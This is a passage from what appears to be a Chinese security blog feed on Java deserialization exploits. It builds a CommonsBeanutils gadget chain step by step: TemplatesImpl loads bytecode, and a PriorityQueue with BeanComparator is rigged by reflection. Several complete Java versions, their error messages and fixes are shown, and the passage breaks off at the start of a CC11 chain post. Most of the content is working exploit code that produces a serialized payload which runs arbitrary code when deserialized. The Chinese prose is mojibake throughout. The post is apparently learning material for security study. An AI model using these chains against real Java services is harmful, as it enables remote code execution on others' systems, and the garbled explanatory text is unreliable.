class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//TemplatesImpl3åæ®µä»£ç æ‰§è¡Œéƒ¨åˆ†</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br><span class="hljs-comment">//        PropertyUtils.getProperty(templates,&quot;outputProperties&quot;);</span><br>        <br>        <span class="hljs-comment">//CBçš„éƒ¨åˆ†</span><br>        BeanComparator&lt;Object&gt; beanComparator = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>&lt;&gt;(<span class="hljs-string">&quot;outputProperties&quot;</span>);<br><br><span class="hljs-comment">//CC4çš„é€»è¾‘éƒ¨åˆ†</span><br>        PriorityQueue&lt;Object&gt; priorityQueue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(beanComparator);<br>        priorityQueue.add(templates);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>æŠ¥é”™ä¿¡æ¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">NoSuchMethodException: java.lang.NoSuchMethodException: Unknown property <span class="hljs-string">&#x27;outputProperties&#x27;</span> on class <span class="hljs-string">&#x27;class java.lang.Integer&#x27;</span><br></code></pre></td></tr></table></figure><p>è·Ÿè¿›æŠ¥é”™ä¿¡æ¯</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240607223017391.png" alt="image-20240607223017391"></p><p>å¯¹2(Interger)è¿™ä¸ªå¯¹è±¡è°ƒç”¨outputPropertiesï¼Œé‚£è‚¯å®šæ²¡æœ‰è¿™ä¸ªæ–¹æ³•ï¼Œé‚æŠ¥é”™</p><p>ä¿®æ”¹æƒ³æ³•ï¼š</p><p>å°†</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">priorityQueue.<span class="hljs-built_in">add</span>(templates);<br>priorityQueue.<span class="hljs-built_in">add</span>(2);<br></code></pre></td></tr></table></figure><p>å˜ä¸º</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">priorityQueue.<span class="hljs-built_in">add</span>(templates);<br>priorityQueue.<span class="hljs-built_in">add</span>(templates);<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯åˆæœ‰ä¸ªé—®é¢˜ï¼Œå› ä¸ºaddä¼šè§¦å‘compareï¼Œå¯¼è‡´åºåˆ—åŒ–çš„æ—¶å€™å°±èµ°å®Œé“¾å­</p><p>æ‰€ä»¥å’±ä»¬å…ˆå¾—è®©é“¾å­æ–­å¼€ï¼Œaddå®Œä¹‹åï¼Œåºåˆ—åŒ–ä¹‹å‰é€šè¿‡åå°„å†å°†é“¾å­è¿æ¥èµ·æ¥</p><p>ä¿®æ”¹åï¼š</p><h3 id="å¯¹è±¡æ¯”è¾ƒé”™è¯¯"><a href="#å¯¹è±¡æ¯”è¾ƒé”™è¯¯" class="headerlink" title="å¯¹è±¡æ¯”è¾ƒé”™è¯¯"></a>å¯¹è±¡æ¯”è¾ƒé”™è¯¯</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//TemplatesImpl3åæ®µä»£ç æ‰§è¡Œéƒ¨åˆ†</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><span class="hljs-comment">//PropertyUtils.getProperty(templates,&quot;outputProperties&quot;);</span><br>        <br>        <span class="hljs-comment">//CBçš„éƒ¨åˆ†</span><br>        BeanComparator&lt;Object&gt; beanComparator = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>&lt;&gt;(<span class="hljs-string">&quot;outputProperties&quot;</span>);<br><br><span class="hljs-comment">//ä¸å¡«beanComparatorï¼Œæ–­å¼€é“¾å­</span><br>        PriorityQueue&lt;Object&gt; priorityQueue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;();<br>        priorityQueue.add(templates);<br>        priorityQueue.add(templates);<br><br><span class="hljs-comment">//åå°„ä¿®æ”¹comparator</span><br>        Class&lt;PriorityQueue&gt; c = PriorityQueue.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">cDeclaredField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<br>        cDeclaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        cDeclaredField.set(priorityQueue, beanComparator);<br><br><br><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>é”™è¯¯ä¿¡æ¯ <code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl cannot be cast to java.lang.Comparable</code> æ„å‘³ç€ <code>PriorityQueue</code> ä¸­çš„ <code>TemplatesImpl</code> å¯¹è±¡åœ¨æ’å…¥æ—¶æ— æ³•è¿›è¡Œæ¯”è¾ƒã€‚<code>PriorityQueue</code> éœ€è¦æ‰€æœ‰å…ƒç´ å®ç° <code>Comparable</code> æ¥å£æˆ–è€…éœ€è¦ä¸€ä¸ª <code>Comparator</code> æ¥å¯¹å…ƒç´ è¿›è¡Œæ¯”è¾ƒã€‚</p><p>ä¿®æ”¹æƒ³æ³•ï¼š</p><p>æ—¢ç„¶templatesä¸èƒ½æ¯”è¾ƒï¼Œé‚£å°±æ¢æˆæ•°å­—ï¼Œè¿™æ€»å¯ä»¥æ¯”è¾ƒå§</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">priorityQueue.<span class="hljs-built_in">add</span>(1);<br>priorityQueue.<span class="hljs-built_in">add</span>(2);<br></code></pre></td></tr></table></figure><p>å¯æ˜¯åˆä¼šå‡ºç°åˆšåˆšä¸èƒ½æ‰¾åˆ°outputPropertiesæ–¹æ³•çš„é—®é¢˜ï¼Œæ‰€ä»¥addå®Œä¹‹åï¼Œåºåˆ—åŒ–ä¹‹å‰è¦å°†<code>priorityQueue.add(1);</code>æ¢æˆ<code>priorityQueue.add(templates)</code></p><h3 id="å®Œæ•´ä»£ç "><a href="#å®Œæ•´ä»£ç " class="headerlink" title="å®Œæ•´ä»£ç "></a>å®Œæ•´ä»£ç </h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//TemplatesImpl3åæ®µä»£ç æ‰§è¡Œéƒ¨åˆ†</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-comment">//CBéƒ¨åˆ†</span><br>        BeanComparator&lt;Object&gt; beanComparator = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>&lt;&gt;(<span class="hljs-string">&quot;outputProperties&quot;</span>);<br><br><br>        PriorityQueue&lt;Object&gt; priorityQueue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;();<br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br><br><span class="hljs-comment">//åå°„ä¿®æ”¹comparatorå’Œqueue</span><br>        Class&lt;PriorityQueue&gt; c = PriorityQueue.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">comparatorField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<br>        comparatorField.setAccessible(<span class="hljs-literal">true</span>);<br>        comparatorField.set(priorityQueue, beanComparator);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">queueField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;queue&quot;</span>);<br>        queueField.setAccessible(<span class="hljs-literal">true</span>);<br>        Object[] queue = (Object[]) queueField.get(priorityQueue);<br>        queue[<span class="hljs-number">0</span>] = templates;<br><br><br><span class="hljs-comment">//        serialize(priorityQueue);</span><br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸ºä»€ä¹ˆä¿®æ”¹ <code>queue</code> å¯ä»¥æ”¹å˜ <code>PriorityQueue</code> çš„è¡Œä¸º</p><p><code>PriorityQueue</code> å†…éƒ¨ä½¿ç”¨æ•°ç»„æ¥å­˜å‚¨å…ƒç´ ï¼Œè€Œè¿™ä¸ªæ•°ç»„çš„å¼•ç”¨è¢«ä¿å­˜åœ¨ <code>queue</code> å­—æ®µä¸­ã€‚</p><p>é€šè¿‡åå°„ï¼Œè·å–äº† <code>PriorityQueue</code> ä¸­ <code>queue</code> å­—æ®µçš„å¼•ç”¨ï¼Œå¹¶ä¸”ç›´æ¥ä¿®æ”¹äº†å®ƒï¼Œå°† <code>TemplatesImpl</code> å¯¹è±¡æ·»åŠ åˆ°äº†é˜Ÿåˆ—çš„ç¬¬ä¸€ä¸ªä½ç½®ã€‚</p><h2 id="å‚è€ƒè¿æ¥"><a href="#å‚è€ƒè¿æ¥" class="headerlink" title="å‚è€ƒè¿æ¥"></a>å‚è€ƒè¿æ¥</h2><p><a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680">JavaBean</a></p><p><a href="https://www.bilibili.com/video/BV1uf4y1T7Rq/?spm_id_from=333.999.0.0&vd_source=d195054a6a081ba07486dcc86c6ba707">Shiroååºåˆ—åŒ–æ¼æ´(ä¸‰)-shiroæ— ä¾èµ–åˆ©ç”¨é“¾</a></p><p><a href="https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html">CommonsBeanutilsä¸æ— commons-collectionsçš„Shiroååºåˆ—åŒ–åˆ©ç”¨</a></p>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVAå®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Javaååºåˆ—åŒ–CommonsCollectionsç¯‡-CC11</title>
    <link href="/2024/06/05/JAVA%E5%AE%89%E5%85%A8/CC11/"/>
    <url>/2024/06/05/JAVA%E5%AE%89%E5%85%A8/CC11/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä¹‹å‰åœ¨å­¦ä¹ CC2çš„æ—¶å€™ï¼ŒCC2æ˜¯CC3+CC4æ”¹å†™çš„ã€‚</p><p>ä»å›¾ä¸­å°±å¯ä»¥çœ‹å‡ºæ¥ï¼ŒCC6ä¹Ÿèƒ½èµ°åˆ°TemplatesImplï¼Œç„¶åç›´æ¥åŠ è½½å­—èŠ‚ç ã€‚</p><p>CC2+CC6æ”¹å†™ï¼Œå°±æ˜¯CC11</p><p><img src="https://image.sp4rks.xyz/2024/06/CC2.png" alt="CC2"></p><h2 id="CC11åˆ©ç”¨é“¾"><a href="#CC11åˆ©ç”¨é“¾" class="headerlink" title="CC11åˆ©ç”¨é“¾"></a>CC11åˆ©ç”¨é“¾</h2><p>ä¹‹å‰åœ¨<a href="https://sp4rks3.github.io/2024/05/27/JAVA%E5%AE%89%E5%85%A8/CC3/">Javaååºåˆ—åŒ–CommonsCollectionsç¯‡-CC3</a>ä¸­æåˆ°åˆ©ç”¨<code>ClassLoader#defineClass</code>ç›´æ¥åŠ è½½å­—èŠ‚ç çš„æ–¹å¼ï¼Œåœ¨è¿™é‡Œå¯ä»¥ç›´æ¥ä½¿ç”¨ã€‚</p><p>å…¶å®è¿™æ ·çš„è¯ï¼Œç›´æ¥ä½¿ç”¨CC2åŠ è½½æ¶æ„å­—èŠ‚ç çš„éƒ¨åˆ†ç»“åˆCC6å‰é¢è°ƒç”¨çš„éƒ¨åˆ†å°±å¯ä»¥ç»„æˆè¿™æ¡é“¾ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <br>        <span class="hljs-comment">//TemplatesImplåŠ è½½æ¶æ„å­—èŠ‚ç </span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span 